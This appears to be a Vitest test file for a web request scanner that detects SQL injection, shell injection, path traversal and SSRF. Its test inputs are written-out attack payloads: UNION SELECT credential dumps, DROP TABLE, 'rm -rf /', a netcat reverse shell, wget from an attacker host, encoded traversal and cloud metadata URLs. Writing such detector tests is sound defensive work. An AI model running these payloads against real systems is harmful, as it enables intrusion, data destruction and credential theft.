import { describe, it, expect } from "vitest";
import {
  detectSqlInjection,
  detectShellInjection,
  detectPathTraversal,
  detectSsrf,
  scanRequest,
} from "./injection.js";

describe("detectSqlInjection", () => {
  it("should return detected: false for empty or falsy inputs", () => {
    expect(detectSqlInjection("")).toEqual({ detected: false });
    expect(detectSqlInjection(undefined as any)).toEqual({ detected: false });
    expect(detectSqlInjection(null as any)).toEqual({ detected: false });
  });

  it("should return detected: false for legitimate text", () => {
    expect(detectSqlInjection("Hello world")).toEqual({ detected: false });
    expect(detectSqlInjection("SELECT * FROM users")).toEqual({
      detected: false,
    });
    expect(detectSqlInjection("normal user search term")).toEqual({
      detected: false,
    });
  });

  it("should detect UNION SELECT injection", () => {
    const res = detectSqlInjection(
      "admin' UNION   SELECT null, username, password FROM accounts--",
    );
    expect(res.detected).toBe(true);
    expect(res.pattern).toBeDefined();
  });

  it("should detect OR 1=1 boolean injection", () => {
    const res = detectSqlInjection("' or 1 = 1");
    expect(res.detected).toBe(true);
    expect(res.pattern).toBeDefined();
  });

  it("should detect DROP TABLE injection", () => {
    const res = detectSqlInjection("; DROP TABLE users;");
    expect(res.detected).toBe(true);
  });

  it("should detect INSERT INTO / DELETE FROM / UPDATE SET injection", () => {
    expect(detectSqlInjection("INSERT INTO users VALUES (1)").detected).toBe(
      true,
    );
    expect(detectSqlInjection("DELETE FROM sessions WHERE 1=1").detected).toBe(
      true,
    );
    expect(detectSqlInjection("UPDATE users SET is_admin = 1").detected).toBe(
      true,
    );
  });

  it("should detect time-based blind SQLi (sleep, benchmark)", () => {
    expect(detectSqlInjection("1; sleep(5)").detected).toBe(true);
    expect(detectSqlInjection("1; benchmark(5000000, MD5(1))").detected).toBe(
      true,
    );
  });

  it("should detect comment endings", () => {
    expect(detectSqlInjection("admin' --").detected).toBe(true);
  });
});

describe("detectShellInjection", () => {
  it("should return detected: false for safe inputs", () => {
    expect(detectShellInjection("")).toEqual({ detected: false });
    expect(detectShellInjection("normal string")).toEqual({ detected: false });
  });

  it("should detect command chaining (; ls, && rm, || echo, | cat)", () => {
    expect(detectShellInjection("input.txt; cat /etc/passwd").detected).toBe(
      true,
    );
    expect(detectShellInjection("file.png && rm -rf /").detected).toBe(true);
    expect(detectShellInjection("fail || echo hacked").detected).toBe(true);
    expect(detectShellInjection("test | whoami").detected).toBe(true);
  });

  it("should detect command substitutions and shells", () => {
    expect(detectShellInjection("`id`").detected).toBe(true);
    expect(detectShellInjection("$(whoami)").detected).toBe(true);
    expect(detectShellInjection("/bin/sh").detected).toBe(true);
    expect(detectShellInjection("/bin/bash").detected).toBe(true);
  });

  it("should detect network utilities (wget, curl, nc, ncat)", () => {
    expect(
      detectShellInjection("wget http://attacker.com/payload").detected,
    ).toBe(true);
    expect(detectShellInjection("curl -O http://evil.com").detected).toBe(true);
    expect(detectShellInjection("nc -e /bin/sh 10.0.0.1 4444").detected).toBe(
      true,
    );
    expect(detectShellInjection("ncat -lp 8080").detected).toBe(true);
  });
});

describe("detectPathTraversal", () => {
  it("should return detected: false for safe paths", () => {
    expect(detectPathTraversal("/images/avatar.png")).toEqual({
      detected: false,
    });
    expect(detectPathTraversal("documents/report.pdf")).toEqual({
      detected: false,
    });
  });

  it("should detect directory traversal dots and slashes", () => {
    expect(detectPathTraversal("../../../etc/passwd").detected).toBe(true);
    expect(detectPathTraversal("..\\..\\windows\\system32").detected).toBe(
      true,
    );
  });

  it("should detect encoded traversal and null byte injections", () => {
    expect(detectPathTraversal("%2e%2e/etc/passwd").detected).toBe(true);
    expect(detectPathTraversal("%252e%252e/etc/passwd").detected).toBe(true);
    expect(detectPathTraversal("avatar.png%00.php").detected).toBe(true);
  });
});

describe("detectSsrf", () => {
  it("should return detected: false for public addresses and standard domains", () => {
    expect(detectSsrf("https://google.com")).toEqual({ detected: false });
    expect(detectSsrf("https://api.github.com/users")).toEqual({
      detected: false,
    });
  });

  it("should detect loopback and private IP ranges", () => {
    expect(detectSsrf("http://127.0.0.1:8080").detected).toBe(true);
    expect(detectSsrf("http://10.0.1.25/admin").detected).toBe(true);
    expect(detectSsrf("http://172.16.0.1/status").detected).toBe(true);
    expect(detectSsrf("http://192.168.1.1/").detected).toBe(true);
    expect(
      detectSsrf("http://169.254.169.254/latest/meta-data/").detected,
    ).toBe(true);
    expect(detectSsrf("http://[::1]:3000").detected).toBe(true);
  });
});

describe("scanRequest", () => {
  it("should return empty threats for clean requests", () => {
    const result = scanRequest(
      "GET",
      "/api/products",
      { search: "shoes", page: "1" },
      JSON.stringify({ note: "please deliver quickly" }),
      { "user-agent": "Mozilla/5.0", "content-type": "application/json" },
    );
    expect(result.threats).toEqual([]);
  });

  it("should detect threats across path, query, body, and headers", () => {
    const sqlInQuery = scanRequest(
      "GET",
      "/api/users",
      { id: "1' or 1=1" },
      "",
      {},
    );
    expect(sqlInQuery.threats.some((t) => t.type === "sql_injection")).toBe(
      true,
    );

    const shellInBody = scanRequest(
      "POST",
      "/api/exec",
      {},
      JSON.stringify({ cmd: "; whoami" }),
      {},
    );
    expect(shellInBody.threats.some((t) => t.type === "shell_injection")).toBe(
      true,
    );

    const traversalInCookie = scanRequest("GET", "/api/profile", {}, "", {
      cookie: "session=../../../etc/passwd",
    });
    expect(
      traversalInCookie.threats.some((t) => t.type === "path_traversal"),
    ).toBe(true);

    const ssrfInReferer = scanRequest("GET", "/api/webhook", {}, "", {
      referer: "http://169.254.169.254/latest",
    });
    expect(ssrfInReferer.threats.some((t) => t.type === "ssrf")).toBe(true);
  });
});
